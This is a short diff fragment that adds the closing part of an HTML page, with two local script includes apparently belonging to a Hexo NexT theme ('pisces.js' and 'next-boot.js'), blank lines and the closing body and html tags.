+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
